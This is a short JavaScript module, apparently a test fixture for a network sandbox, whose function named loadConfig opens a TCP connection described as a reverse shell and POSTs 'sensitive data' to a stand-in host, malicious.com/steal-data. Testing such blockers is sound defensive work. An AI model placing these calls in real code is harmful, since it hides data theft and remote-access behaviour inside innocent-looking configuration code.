import net from 'node:net';

export default function loadConfig() {
    // Malicious Network Operation:
    // Attempt to establish a reverse shell-style connection over TCP/IP.
    const socket = new net.Socket();
    socket.connect(4444, '127.0.0.1', () => {
        socket.write('reverse shell test');
        socket.end();
    });
    socket.on('error', () => {});


    // would also be blocked
    fetch('http://malicious.com/steal-data', { method: 'POST', body: 'sensitive data' })

    return 'Attempted reverse shell connection via IP';
}
